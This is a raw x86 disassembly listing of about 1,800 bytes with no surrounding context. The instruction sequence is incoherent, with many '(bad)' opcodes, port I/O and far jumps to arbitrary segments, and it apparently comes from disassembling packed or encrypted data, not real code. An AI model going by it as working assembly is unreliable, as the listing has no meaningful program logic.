  411fb2:	xchg   ebp,eax
  411fb3:	adc    DWORD PTR ds:0x502895d7,edi
  411fb9:	or     al,al
  411fbb:	push   ebp
  411fbc:	mov    bh,0xed
  411fbe:	or     DWORD PTR [esi+ecx*8+0x1d],ebp
  411fc2:	shl    edx,1
  411fc4:	sbb    al,0xd9
  411fc6:	xor    al,0x1a
  411fc8:	out    dx,al
  411fc9:	and    eax,0x1365b268
  411fce:	or     al,BYTE PTR [eax-0x5da1211d]
  411fd4:	ins    BYTE PTR es:[edi],dx
  411fd5:	loopne 0x411fc9
  411fd7:	in     eax,dx
  411fd8:	outs   dx,BYTE PTR ds:[esi]
  411fd9:	jne    0x411f7b
  411fdb:	ret    
  411fdc:	(bad)  
  411fdd:	pop    ds
  411fde:	(bad)
  411fe2:	imul   DWORD PTR [esi+0x2bdcb29b]
  411fe8:	push   cs
  411fe9:	add    DWORD PTR [esi],edi
  411feb:	xor    DWORD PTR [edx],edi
  411fed:	cmc    
  411fee:	sbb    bh,BYTE PTR [edi+0xb]
  411ff1:	imul   BYTE PTR [edx]
  411ff3:	les    ecx,FWORD PTR [eax+0x33]
  411ff6:	clc    
  411ff7:	xchg   BYTE PTR [eax+0x6e],dh
  411ffa:	mov    eax,ds:0x7fbe3faf
  411fff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412000:	mov    cl,0x66
  412002:	add    DWORD PTR [ebx],esp
  412004:	mov    bh,0x6a
  412006:	in     al,0xbd
  412008:	xor    ebx,DWORD PTR [edx+0x3bccd760]
  41200e:	lds    eax,FWORD PTR ds:0xe4ace3ed
  412014:	into   
  412015:	(bad)  
  412016:	mov    eax,ds:0xd6ddf374
  41201b:	ja     0x411fd7
  41201d:	or     ch,BYTE PTR [ebx+ebp*4]
  412020:	mov    bl,0xcb
  412022:	(bad)  
  412023:	out    dx,al
  412024:	int3   
  412025:	or     bl,BYTE PTR [ebx+0x9832ee7]
  41202b:	(bad)  
  41202c:	mov    ds:0x79e97eb1,al
  412031:	sub    esi,DWORD PTR ds:0x2e5b8592
  412037:	mov    eax,0x116b1e6b
  41203c:	mov    sp,0xa4e
  412040:	cmp    ecx,DWORD PTR [eax-0x31]
  412043:	adc    eax,0x71066c51
  412048:	out    0x60,al
  41204a:	test   eax,0xf0378eba
  41204f:	stos   DWORD PTR es:[edi],eax
  412050:	dec    ebp
  412051:	and    BYTE PTR [ebp-0x1e8dc7bc],ah
  412057:	and    cl,BYTE PTR [eax+0x4f]
  41205a:	nop
  41205b:	jae    0x41204e
  41205d:	ds hlt 
  41205f:	in     al,0x79
  412061:	adc    BYTE PTR [ecx+0x42b40484],bh
  412067:	jecxz  0x41204c
  412069:	add    DWORD PTR [ecx],eax
  41206b:	lods   al,BYTE PTR ds:[esi]
  41206c:	cmc    
  41206d:	xor    eax,0xf17d49ec
  412072:	ret    
  412073:	imul   ebp,DWORD PTR [ecx-0x5b],0x6f
  412077:	pop    ds
  412078:	mov    edi,0x68f64e41
  41207d:	nop
  41207e:	inc    ebx
  41207f:	dec    esi
  412080:	nop
  412081:	sahf   
  412082:	jg     0x412065
  412084:	fcmovnu st,st(1)
  412086:	(bad)  
  412087:	in     eax,0x17
  412089:	mul    BYTE PTR [esi-0x4]
  41208c:	xchg   ecx,eax
  41208d:	sbb    dh,bh
  41208f:	pop    es
  412090:	pop    esi
  412091:	add    al,BYTE PTR fs:[ecx-0x8]
  412095:	enter  0xa317,0x7c
  412099:	repz ror DWORD PTR [edi+0x17ae5f77],0xe2
  4120a1:	fisubr WORD PTR [edi+0x1b]
  4120a4:	jg     0x41206e
  4120a6:	arpl   WORD PTR [esi-0x7bc915f4],bx
  4120ac:	fst    DWORD PTR [ecx]
  4120ae:	test   eax,0x97d7feb3
  4120b3:	jno    0x41211e
  4120b5:	daa    
  4120b6:	dec    ecx
  4120b7:	in     eax,dx
  4120b8:	scas   eax,DWORD PTR es:[edi]
  4120b9:	clc    
  4120ba:	and    al,0x6f
  4120bc:	xchg   ecx,eax
  4120bd:	sub    ebp,ebp
  4120bf:	mov    ds:0x10a28a8f,eax
  4120c4:	inc    ebx
  4120c5:	mov    ebx,0x559b9d63
  4120ca:	inc    edi
  4120cb:	pop    edi
  4120cc:	repnz inc esp
  4120ce:	test   eax,0x78bfe574
  4120d3:	mov    dl,BYTE PTR [edx+0x20fb0640]
  4120d9:	sub    eax,0x5fd708da
  4120de:	pop    ebp
  4120df:	add    al,0xc2
  4120e1:	repnz mov edx,0xb8517bd0
  4120e7:	and    bh,BYTE PTR [eax+ebp*8+0x70]
  4120eb:	or     al,0xd9
  4120ed:	xchg   edi,eax
  4120ef:	xlat   BYTE PTR ds:[ebx]
  4120f0:	lahf   
  4120f1:	and    eax,0xc3b4483b
  4120f6:	loopne 0x4120ec
  4120f8:	cmp    DWORD PTR [ecx+esi*2+0x20bd2891],esp
  4120ff:	ds adc eax,0x1b4db6d6
  412105:	leave  
  412106:	xor    al,0xc4
  412108:	add    eax,0xb9d5a2ad
  41210d:	pop    esp
  41210e:	shl    BYTE PTR [esi+0x1686b627],0xa5
  412115:	pushf  
  412116:	push   ebp
  412117:	sbb    ecx,esi
  412119:	and    BYTE PTR [ebp-0x39],0xdf
  41211d:	in     eax,dx
  41211e:	in     eax,0x32
  412120:	nop
  412121:	sub    al,0xfa
  412123:	or     bl,BYTE PTR [eax+0x2ebf58e6]
  412129:	shr    BYTE PTR [edi+0x1eb55b8c],cl
  41212f:	(bad)  
  412130:	xlat   BYTE PTR ds:[ebx]
  412131:	pop    esi
  412132:	inc    ecx
  412133:	popf   
  412134:	fiadd  DWORD PTR [esi]
  412136:	mov    ebp,0x2cbc834b
  41213b:	cmp    DWORD PTR [edi+0x1],eax
  41213e:	mov    ds:0x8412134b,eax
  412143:	das    
  412144:	dec    esi
  412145:	test   al,0x61
  412147:	(bad)  
  412148:	jmp    0x41212c
  41214a:	cmp    dh,al
  41214c:	int3   
  41214d:	xchg   edx,eax
  41214e:	jbe    0x41214e
  412150:	mov    bx,0xe4aa
  412154:	sub    ebx,DWORD PTR ds:0x37e59862
  41215a:	sub    dh,BYTE PTR [esi]
  41215c:	pavgw  mm0,QWORD PTR [edx+0x42]
  412160:	cmp    al,0xb0
  412162:	scas   eax,DWORD PTR es:[edi]
  412163:	xor    cl,dh
  412165:	cwde   
  412166:	call   0x8fbbc0d
  41216b:	xchg   ebp,eax
  41216c:	stc    
  41216d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41216e:	cmp    ah,BYTE PTR gs:[ebp-0xc8a8375]
  412175:	jno    0x41214e
  412177:	xor    al,0x9c
  412179:	add    ch,BYTE PTR [edx-0x40]
  41217c:	mov    dl,BYTE PTR [ebp-0x18]
  41217f:	dec    ebx
  412180:	ret    0xdb3d
  412183:	mov    WORD PTR [edi-0x4511b10c],es
  412189:	adc    ch,BYTE PTR [ebx]
  41218b:	ret    0x1fff
  41218e:	scas   al,BYTE PTR es:[edi]
  41218f:	add    bl,dl
  412191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412192:	cmp    eax,0x17f04c23
  412197:	in     al,dx
  412198:	add    edx,esi
  41219a:	in     eax,0x87
  41219c:	xchg   eax,ecx
  41219e:	mov    esp,0x5e6206fd
  4121a3:	sbb    al,0x64
  4121a5:	xlat   BYTE PTR ds:[ebx]
  4121a6:	sbb    dh,dh
  4121a8:	fcmovnbe st,st(7)
  4121aa:	or     dh,BYTE PTR [edi+0x2e6982a7]
  4121b0:	lock xor eax,0x5f9d1ef7
  4121b6:	xchg   esi,eax
  4121b7:	retf   0x4c41
  4121ba:	ins    BYTE PTR es:[edi],dx
  4121bb:	test   al,0x53
  4121bd:	andps  xmm5,XMMWORD PTR [ecx]
  4121c0:	mov    ah,0x91
  4121c2:	adc    cl,BYTE PTR [ecx-0x28]
  4121c5:	jl     0x412219
  4121c7:	aas    
  4121c8:	loopne 0x4121fc
  4121ca:	inc    esi
  4121cc:	cmp    DWORD PTR cs:[ebp-0x42dae7e4],edx
  4121d3:	mov    BYTE PTR [ecx+ebx*4],0x59
  4121d7:	adc    ch,ah
  4121d9:	(bad)  
  4121da:	je     0x41220c
  4121dc:	in     eax,0x52
  4121de:	push   ecx
  4121df:	and    cl,cl
  4121e1:	not    BYTE PTR [eax+0xb8c410e]
  4121e7:	cmovs  esi,DWORD PTR [edi+esi*8+0x1aa54003]
  4121ef:	out    dx,al
  4121f0:	add    eax,0xdf0d13f
  4121f5:	mov    es,eax
  4121f7:	inc    ebp
  4121f8:	and    eax,ebx
  4121fa:	shl    BYTE PTR [ebp-0x5e],1
  4121fd:	mov    dl,0x6b
  4121ff:	mov    esi,0xb5af888e
  412204:	ins    BYTE PTR es:[edi],dx
  412205:	dec    esi
  412206:	popf   
  412207:	lods   eax,DWORD PTR ds:[esi]
  412208:	sbb    eax,0x4622fe96
  41220d:	les    edi,FWORD PTR [ecx+ebp*8+0x4b]
  412211:	cmp    edx,edx
  412213:	or     eax,0x91316800
  412218:	aad    0x52
  41221a:	add    DWORD PTR [edi+0x6c75141a],esp
  412220:	fcmovnbe st,st(1)
  412222:	inc    ecx
  412223:	push   es
  412224:	mov    edi,0x56274fa
  412229:	call   0xb47:0x3d77ac60
  412230:	xchg   ebx,eax
  412231:	jo     0x4121bf
  412233:	vaddss xmm5,xmm0,DWORD PTR [eax-0x15dceaff]
  41223b:	aad    0xd
  41223d:	fbstp  TBYTE PTR ds:0x68b73537
  412243:	ror    ah,0x1e
  412246:	pusha  
  412247:	mov    ds:0xf7dd678e,al
  41224c:	rcl    DWORD PTR [edx-0x21],cl
  41224f:	test   eax,0x4ffa6411
  412254:	pop    ss
  412255:	shl    BYTE PTR [edx+ecx*2-0x1fc381e8],1
  41225c:	mov    dh,0x27
  41225e:	sbb    dh,BYTE PTR [ebp-0x6dd4522a]
  412264:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412265:	cmc    
  412266:	mov    cl,0xc3
  412268:	rcl    DWORD PTR [ecx+edi*2+0x730f96e9],0x9
  412270:	ins    BYTE PTR es:[edi],dx
  412271:	inc    eax
  412272:	ffree  st(1)
  412274:	push   esp
  412275:	add    BYTE PTR es:[ebp-0x28],dh
  412279:	mov    bh,ch
  41227b:	sbb    eax,0x308054cc
  412280:	pop    esp
  412281:	lock mov al,ds:0x537d12c2
  412287:	stos   DWORD PTR es:[edi],eax
  412288:	mov    ebp,0x60a48028
  41228d:	xchg   ch,cl
  41228f:	aas    
  412290:	push   0x5f43b077
  412295:	push   0xffffffd3
  412297:	cmp    ah,BYTE PTR [esi]
  412299:	adc    cl,ch
  41229b:	ss mov ebp,0xc8b545a8
  4122a1:	retf   
  4122a2:	inc    ebx
  4122a3:	fiadd  WORD PTR [eax+eiz*2+0x4d]
  4122a7:	adc    BYTE PTR [esi+0x7],dh
  4122aa:	jno    0x4122cd
  4122ac:	das    
  4122ad:	nop
  4122ae:	lahf   
  4122af:	mov    bh,0x71
  4122b1:	xchg   edi,eax
  4122b2:	icebp  
  4122b3:	stos   DWORD PTR es:[edi],eax
  4122b4:	cmp    cl,BYTE PTR [eax]
  4122b6:	hlt    
  4122b7:	sbb    cl,bh
  4122b9:	xor    DWORD PTR [ebp+0x1d],esp
  4122bc:	aaa    
  4122bd:	(bad)  
  4122bf:	mov    eax,0x25146b79
  4122c4:	js     0x4122db
  4122c6:	iret   
  4122c7:	adc    cl,BYTE PTR [edi+0x50]
  4122ca:	mov    ecx,0x7e14567b
  4122cf:	(bad)  
  4122d0:	mov    WORD PTR [ebp+edx*8+0x19],es
  4122d4:	sahf   
  4122d5:	lods   al,BYTE PTR ds:[esi]
  4122d6:	pop    esp
  4122d7:	push   cs
  4122d8:	add    BYTE PTR [ebp-0x30],dh
  4122db:	ins    DWORD PTR es:[edi],dx
  4122dc:	or     dh,BYTE PTR [esp+edx*2-0x4c22cd61]
  4122e3:	push   ecx
  4122e4:	add    al,0xe
  4122e6:	mov    esp,0x5b42e55
  4122eb:	add    eax,0xbe7f1c44
  4122f0:	dec    bx
  4122f2:	daa    
  4122f3:	in     al,dx
  4122f4:	jo     0x41230c
  4122f6:	fistp  QWORD PTR [ecx]
  4122f8:	pop    edx
  4122f9:	in     al,0xe6
  4122fb:	pushf  
  4122fc:	pusha  
  4122fd:	call   0xa2d6e364
  412302:	and    BYTE PTR gs:[edi+0x2fef3386],0xaa
  41230a:	ins    DWORD PTR es:[edi],dx
  41230b:	les    ecx,FWORD PTR [eax+0x2a]
  41230e:	sub    BYTE PTR [ebp+0x2b94705b],bl
  412314:	shl    al,1
  412316:	jmp    0x41237a
  412318:	stos   BYTE PTR es:[edi],al
  412319:	stos   BYTE PTR es:[edi],al
  41231a:	jecxz  0x41237a
  41231c:	scas   al,BYTE PTR es:[edi]
  41231d:	scas   al,BYTE PTR es:[edi]
  41231e:	fild   QWORD PTR [ecx+0x21a994b2]
  412324:	fwait
  412325:	mov    al,0xc8
  412327:	sub    edi,DWORD PTR [ecx-0x62]
  41232a:	mov    al,ds:0xefdb5b78
  41232f:	or     eax,DWORD PTR [edx-0x33]
  412332:	nop
  412333:	and    al,0x5d
  412335:	xor    eax,0x5a61b546
  41233a:	test   ah,0x76
  41233d:	mov    ds:0xd2cf1c5,al
  412342:	jg     0x412323
  412344:	enter  0x2598,0x6a
  412348:	push   es
  412349:	pop    ebp
  41234a:	inc    ebx
  41234b:	test   DWORD PTR [ecx-0x5c35f327],esp
  412351:	icebp  
  412352:	scas   eax,DWORD PTR es:[edi]
  412353:	cmp    DWORD PTR [esi-0x79],0x50
  412357:	dec    esi
  412358:	cwde   
  412359:	inc    eax
  41235a:	or     al,al
  41235c:	dec    edx
  41235d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41235e:	ins    DWORD PTR es:[edi],dx
  41235f:	fdivr  QWORD PTR [ebp+ebx*1+0x64a0edc1]
  412366:	inc    DWORD PTR [edi+0xb]
  412369:	push   ss
  41236a:	(bad)  
  41236b:	arpl   WORD PTR [ebp+eax*2+0x46],dx
  41236f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412370:	pop    esp
  412371:	mov    dl,0x82
  412373:	sub    DWORD PTR ds:0x767ba32b,eax
  412379:	adc    edx,esp
  41237b:	dec    esi
  41237c:	enter  0x48ed,0x2c
  412380:	mov    al,ds:0x8137fa0e
  412385:	repz pop ds
  412387:	push   es
  412388:	pop    ebp
  412389:	sbb    BYTE PTR [edx+0x27f1ccd6],al
  41238f:	fist   DWORD PTR [edx-0x35ca13ee]
  412395:	hlt    
  412396:	and    al,cl
  412398:	adc    dl,BYTE PTR [ebx-0x41ada83f]
  41239e:	(bad)  [eax+ecx*2+0x40]
  4123a2:	sub    DWORD PTR [esi+0x66],0xfffffffd
  4123a6:	push   esp
  4123a7:	mov    bh,0x8
  4123a9:	sub    eax,0x94e08e05
  4123ae:	sub    BYTE PTR [ecx+esi*1-0xfdf982],dl
  4123b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123b7:	mov    ebp,0xcc07f264
  4123bc:	bound  ebx,QWORD PTR [ecx+0x117b3b4d]
  4123c2:	sub    eax,0x8cf164f2
  4123c7:	push   0xffffffba
  4123c9:	inc    edx
  4123ca:	adc    DWORD PTR [ecx+0x413aba2],esi
  4123d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123d1:	xchg   DWORD PTR [edx-0x6c48c2d3],esp
  4123d7:	sub    BYTE PTR [edx-0x533f6645],0x9e
  4123de:	pop    ds
  4123df:	dec    ebp
  4123e0:	outs   dx,DWORD PTR ds:[esi]
  4123e1:	addr16 inc ebx
  4123e3:	scas   eax,DWORD PTR es:[edi]
  4123e4:	loope  0x4123a6
  4123e6:	mov    eax,0xaf1bf902
  4123eb:	sahf   
  4123ec:	sbb    eax,0x87751c80
  4123f1:	add    ebx,edx
  4123f3:	ret    
  4123f4:	and    DWORD PTR [edi+0x1],edi
  4123f7:	sub    ch,al
  4123f9:	sub    eax,0xe14c5669
  4123fe:	push   eax
  4123ff:	call   0xfa6eb676
  412404:	xchg   esp,eax
  412405:	rcr    DWORD PTR ds:[ebp+0x6],0xa0
  41240a:	sub    al,0x83
  41240c:	mov    cl,0x52
  41240e:	scas   eax,DWORD PTR es:[edi]
  41240f:	or     DWORD PTR [ebx+esi*4+0x7b],edi
  412413:	movaps xmm0,xmm5
  412416:	mov    WORD PTR [esi],cs
  412418:	mov    ?,WORD PTR [eax+0x559f84f4]
  41241e:	gs dec ebp
  412420:	outs   dx,BYTE PTR ds:[esi]
  412421:	cmp    BYTE PTR [edx-0x4],dh
  412424:	mov    al,ds:0x222b3879
  412429:	jecxz  0x4123d1
  41242b:	test   BYTE PTR [esi-0x72],0x65
  41242f:	mov    ebp,0xe25017a7
  412434:	sub    al,0x37
  412436:	xchg   DWORD PTR [ecx+0x7e],edi
  412439:	sbb    al,0x32
  41243b:	inc    bp
  41243d:	das    
  41243e:	icebp  
  41243f:	jb     0x4123f5
  412441:	sahf   
  412442:	popa   
  412443:	aas    
  412444:	fnstcw WORD PTR [ebx+0x4d]
  412447:	jmp    0x193e0e59
  41244c:	stos   BYTE PTR es:[edi],al
  41244d:	jp     0x41246e
  41244f:	add    eax,0xff490193
  412454:	jge    0x4124a1
  412456:	adc    eax,edi
  412458:	xor    eax,0x7587dfac
  41245d:	push   0x74061849
  412462:	adc    BYTE PTR [edx-0x5e45b904],0x19
  412469:	push   esi
  41246a:	pop    DWORD PTR ds:0x54cc7210
  412470:	inc    ecx
  412471:	or     al,0x3c
  412473:	xor    DWORD PTR [edx+0x54],esp
  412476:	aam    0xed
  412478:	mov    ecx,0xf51c07a6
  41247d:	(bad)  
  41247e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41247f:	hlt    
  412480:	add    al,0xc5
  412482:	lods   eax,DWORD PTR ds:[esi]
  412483:	mov    ds:0x89624ff8,al
  412488:	mov    WORD PTR [esi+0x24],ds
  41248b:	xor    edx,eax
  41248d:	add    ah,bh
  41248f:	or     eax,0x14165652
  412494:	cdq    
  412495:	repz (bad) 
  412497:	xchg   edx,eax
  412498:	adc    ecx,DWORD PTR es:0xdfba6453
  41249f:	ud1    edx,DWORD PTR [ebx+0x69]
  4124a3:	pop    ss
  4124a4:	addr16 mov eax,0x59895afe
  4124aa:	jo     0x4124e7
  4124ac:	jmp    0x4124f5
  4124ae:	jno    0x4124d8
  4124b0:	add    eax,0x2e740797
  4124b5:	fdiv   QWORD PTR [edi]
  4124b7:	xlat   BYTE PTR ds:[ebx]
  4124b8:	jg     0x412469
  4124ba:	fdivp  st(4),st
  4124bc:	mov    ebp,0x1bfc3229
  4124c1:	mov    al,gs:0x7aa10538
  4124c7:	es aad 0x17
  4124ca:	mov    edi,ecx
  4124cc:	lahf   
  4124cd:	jg     0x4124e1
  4124cf:	push   ds
  4124d0:	jns    0x412523
  4124d2:	sub    DWORD PTR [ecx],ebx
  4124d4:	jnp    0x4124fb
  4124d6:	pop    esi
  4124d7:	adc    al,0x3f
  4124d9:	lahf   
  4124da:	cmp    al,0x19
  4124dc:	sub    BYTE PTR [edx+ebx*2],ch
  4124df:	xchg   edx,eax
  4124e0:	jl     0x4124bf
  4124e2:	fistp  WORD PTR [esi+0x7d]
  4124e5:	jg     0x4124ae
  4124e7:	dec    esp
  4124e8:	adc    eax,0x63570716
  4124ed:	call   0xe741:0xbe4a8742
  4124f4:	shr    BYTE PTR [edi],0xb5
  4124f7:	xor    DWORD PTR [ebx-0x1d4bd9ae],eax
  4124fd:	add    al,0xda
  4124ff:	push   ds
  412500:	and    cl,BYTE PTR [ebx]
  412502:	or     ebp,eax
  412504:	addr16 aad 0xfd
  412507:	dec    ebp
  412508:	loop   0x4124f4
  41250a:	rcr    BYTE PTR [eax+0x33],1
  41250d:	push   cs
  41250e:	mov    bl,0x2f
  412510:	sbb    eax,0x1adbf1a8
  412515:	ret    0x11a9
  412518:	push   ss
  412519:	sub    DWORD PTR [ebx+0x47431cfa],0xffffffc3
  412520:	not    BYTE PTR [esi+0x1075284e]
  412526:	push   ebx
  412527:	sub    al,0x48
  412529:	popf   
  41252a:	pusha  
  41252b:	lock sbb ch,BYTE PTR [ebx]
  41252e:	popa   
  41252f:	push   ebp
  412530:	(bad)  
  412532:	inc    esi
  412533:	inc    ecx
  412534:	call   0x9da381ca
  412539:	cwde   
  41253a:	sbb    dh,BYTE PTR [edi]
  41253c:	mov    bh,0x21
  41253e:	rol    ah,cl
  412540:	mov    cl,0x1d
  412542:	fstp   DWORD PTR [eax-0x138f786a]
  412548:	xor    eax,0x857cdeb6
  41254d:	cmc    
  41254e:	push   edi
  41254f:	jecxz  0x4125b4
  412551:	or     dl,ah
  412553:	shl    BYTE PTR [ecx-0x7f06bf4d],1
  412559:	imul   BYTE PTR [eax-0x18]
  41255c:	mov    ebx,0x37df327d
  412561:	xor    eax,0xf1e08f58
  412566:	retf   0x790
  412569:	jmp    0xf67f:0xab46eb6c
  412570:	sub    DWORD PTR [edx+0x18],ecx
  412573:	sbb    DWORD PTR [esi],eax
  412575:	mov    bh,0x97
  412577:	lods   eax,DWORD PTR ds:[esi]
  412578:	jns    0x4125ee
  41257a:	lea    edi,[edi]
  41257c:	xchg   edi,eax
  41257d:	mov    esi,0x8ef5e86c
  412582:	loopne 0x4125ae
  412584:	xor    DWORD PTR [ecx-0x2bed5b46],ebp
  41258a:	int3   
  41258b:	xor    DWORD PTR [eax],eax
  41258d:	cmp    bh,bh
  41258f:	xor    edx,DWORD PTR [ebx+0x1d5ebb8e]
  412595:	rcr    bl,cl
  412597:	lds    edi,FWORD PTR [ebp-0x39cf861a]
  41259d:	nop
  41259e:	mov    bl,0xf1
  4125a0:	bound  ecx,QWORD PTR [eax+0x5437ee4f]
  4125a6:	push   esp
  4125a7:	out    0x16,eax
  4125a9:	int    0x4d
  4125ab:	add    dl,cl
  4125ad:	(bad)  
  4125ae:	test   DWORD PTR [edi+ecx*4-0x210de18a],esi
  4125b5:	repz enter 0x83f2,0x7f
  4125ba:	inc    edx
  4125bb:	(bad)  
  4125bc:	js     0x4125f5
  4125be:	xor    al,al
  4125c0:	ret    0x808d
  4125c3:	out    0x6d,al
  4125c5:	pushf  
  4125c6:	xchg   BYTE PTR [edi],cl
  4125c8:	lahf   
  4125c9:	daa    
  4125ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125cb:	inc    esi
  4125cc:	into   
  4125cd:	leave  
  4125ce:	xchg   ebp,eax
  4125cf:	sbb    DWORD PTR [edi+eax*1+0x4a],ebp
  4125d3:	or     DWORD PTR [esi],eax
  4125d5:	mov    DWORD PTR [esi],ebx
  4125d7:	pop    ecx
  4125d8:	push   ds
  4125d9:	ror    DWORD PTR [edx+0x5d],cl
  4125dc:	imul   edi,DWORD PTR [ecx+0x4a],0xffffffd5
  4125e0:	cmp    BYTE PTR ds:[ebx+0x37],ch
  4125e4:	xor    eax,edi
  4125e6:	div    DWORD PTR [edi]
  4125e8:	shl    dl,1
  4125ea:	jmp    0x412652
  4125ec:	cdq    
  4125ed:	push   cs
  4125ee:	test   eax,0x18439682
  4125f3:	mov    ecx,DWORD PTR [eax]
  4125f5:	ss dec eax
  4125f7:	xchg   edx,eax
  4125f8:	adc    al,BYTE PTR [ecx]
  4125fa:	mov    dh,0x26
  4125fc:	ds fs sub al,0x7a
  412600:	and    al,0xd5
  412602:	and    dh,BYTE PTR [esi-0x22]
  412605:	sub    bh,al
  412607:	shr    DWORD PTR [eax-0x7b],cl
  41260a:	imul   edx,DWORD PTR ds:0x66442b42,0x2
  412611:	nop
  412612:	lods   eax,DWORD PTR ds:[esi]
  412613:	test   eax,0x9cfcce1f
  412618:	sbb    ebp,ebp
  41261a:	mov    al,0xed
  41261c:	add    esi,DWORD PTR [edi+0x5f]
  41261f:	xlat   BYTE PTR ds:[ebx]
  412620:	pop    ebx
  412621:	repnz mov ecx,0x2edcc123
  412627:	and    cl,0xdf
  41262a:	sub    dh,BYTE PTR [edi+0x12980cd1]
  412630:	cmp    ah,cl
  412632:	dec    edi
  412633:	and    eax,0x3f2fbfe1
  412638:	jecxz  0x4125ce
  41263a:	fadd   QWORD PTR [ecx]
  41263c:	gs fwait
  41263e:	js     0x4126a3
  412640:	idiv   DWORD PTR [edi+0x78b5ea56]
  412646:	cmp    eax,0xe0cf5b1a
  41264b:	mov    cl,0xaa
  41264d:	mov    ch,0x86
  41264f:	adc    al,0x65
  412651:	inc    DWORD PTR [ebp+ebx*1-0x1420205]
  412658:	fisub  DWORD PTR [eax+0x2f70aac1]
  41265e:	and    cl,dl
  412660:	call   DWORD PTR [edi+0x55c1d9a8]
  412666:	mov    cl,0xe8
  412668:	out    dx,eax
  412669:	jmp    0x515c:0xd7287104
  412670:	gs mov ch,0x3
  412673:	jns    0x4125fd
  412675:	lea    ebx,[ebp+0x63589d93]
  41267b:	sub    eax,0xc995ea46
  412680:	ins    DWORD PTR es:[edi],dx
  412681:	inc    edi
  412682:	sbb    eax,0xb50ae835
  412687:	pop    esp
  412688:	(bad)  
  412689:	mov    DWORD PTR [ebx+0x8],ecx
  41268c:	adc    dh,BYTE PTR ds:0x36d589e0
  412692:	sbb    BYTE PTR [ecx-0xb5c36e1],ah
  412698:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412699:	clc    
  41269a:	push   ebx
  41269b:	dec    eax
  41269c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41269d:	mov    edi,0x3e158af3
  4126a2:	sbb    al,0xc5
  4126a4:	bound  eax,QWORD PTR [ecx+0x2d]
  4126a7:	(bad)  [ecx-0x70]
  4126aa:	ror    DWORD PTR [edx],0x74
  4126ad:	jmp    0xa7e0:0xaabd4ae
  4126b4:	fisubr WORD PTR [edi-0x73]
  4126b7:	lds    ecx,FWORD PTR [ecx-0x7f]
  4126ba:	mov    bh,0xdc
  4126bc:	pop    DWORD PTR [eax+0x2128cd5]
  4126c2:	stos   BYTE PTR es:[edi],al
  4126c3:	sbb    eax,0x2f45cc17
  4126c8:	ja     0x41265b
  4126ca:	dec    esp
  4126cb:	xor    bh,BYTE PTR [edi+0x3fba3ec]
  4126d1:	outs   dx,BYTE PTR ds:[esi]
  4126d2:	mov    al,0x95
  4126d4:	jb     0x412722
  4126d6:	lea    esp,[ebx-0x73e4fa7a]
  4126dc:	popa   
  4126dd:	xor    al,0x4a
  4126df:	and    DWORD PTR ss:[ebx+0x12079ab7],ebp
  4126e6:	ins    BYTE PTR es:[edi],dx
  4126e7:	cmp    al,0x55
  4126e9:	call   0xeb5f:0x68eb324e
  4126f0:	xchg   DWORD PTR [edx],edi
  4126f2:	imul   BYTE PTR es:[ebx+0x434bb7cc]
  4126f9:	sti    
  4126fa:	cmp    esp,0x2de9c49b
  412700:	aaa    
  412701:	inc    esp
  412702:	(bad)  
  412703:	jmp    0x6dd4:0xebbf0c3a
  41270a:	sbb    al,0xb3
  41270c:	push   esp
  41270d:	test   al,0x72
  41270f:	sub    BYTE PTR [edi+0x42e6fc68],bh
  412715:	aaa    
  412716:	leave  
  412717:	shr    DWORD PTR [esi-0xd],0xc9
  41271b:	and    ch,BYTE PTR [edi-0x33]
  41271e:	mov    bh,0x2c
  412720:	mov    al,ds:0xdd8ba59e
  412725:	and    eax,0xf9438a97
  41272a:	sbb    al,0x4a
  41272c:	pop    edx
  41272d:	fild   WORD PTR [ebp+0x23]
  412730:	js     0x41273e
  412732:	push   esp
  412733:	sahf   
  412734:	ins    DWORD PTR es:[edi],dx
  412735:	inc    ebx
  412736:	dec    ecx
  412737:	stc    
  412738:	inc    eax
  412739:	add    dl,BYTE PTR [edx]
  41273b:	jno    0x4126c7
  41273d:	xor    ecx,edi
  41273f:	pushf  
  412740:	sub    BYTE PTR [ecx+0x26],dl
  412743:	dec    ebx
  412744:	sub    DWORD PTR [esi-0x7c47a1af],esi
  41274a:	sub    edi,DWORD PTR [ecx-0x6d8761d8]
  412750:	mov    dl,0x7b
  412752:	mov    eax,ss
  412754:	pop    edx
  412755:	push   ss
  412756:	cmp    DWORD PTR [ebp-0x13],ebx
  412759:	mov    ds:0xba3852ee,eax
  41275e:	aaa    
  41275f:	fsub   DWORD PTR [edx+0x319a7c2]
  412765:	and    DWORD PTR [ebx],esi
  412767:	or     BYTE PTR [edx-0x7b],ah
  41276a:	xor    al,0x42
  41276c:	dec    eax
  41276d:	inc    ebx
  41276e:	adc    al,0xde
  412770:	inc    ecx
  412771:	mov    edi,0xacbc92b2
  412776:	xchg   BYTE PTR [esi-0x5fc00f0f],cl
  41277c:	test   eax,0x5f759b75
  412781:	frstor [esi]
  412783:	jge    0x412735
  412785:	xchg   ebp,eax
  412786:	scas   al,BYTE PTR es:[edi]
  412787:	xchg   esp,eax
  412788:	(bad)  
  412789:	popa   
  41278a:	neg    DWORD PTR ds:0xc3a31a71
  412790:	xchg   edx,eax
  412791:	push   es
  412792:	inc    cx
  412794:	dec    BYTE PTR [ecx-0x6571a58f]
  41279a:	jmp    0x4127c1
  41279c:	add    DWORD PTR [edi+edi*2],edx
  41279f:	pop    es
  4127a0:	sti    
  4127a1:	dec    esi
  4127a2:	jmp    0x412734
  4127a4:	and    al,0xbf
  4127a6:	popa   
  4127a7:	cs inc edi
  4127a9:	jp     0x412803
  4127ab:	sbb    eax,0x7c07d02d
  4127b0:	mov    ebp,ebx
  4127b2:	mov    eax,ds:0x64f63103
  4127b7:	imul   ebx,DWORD PTR [edx-0x42c43036],0xf21b5717
  4127c1:	mov    dh,al
  4127c3:	shl    DWORD PTR [esi+0x11],1
  4127c6:	daa    
  4127c7:	dec    ebp
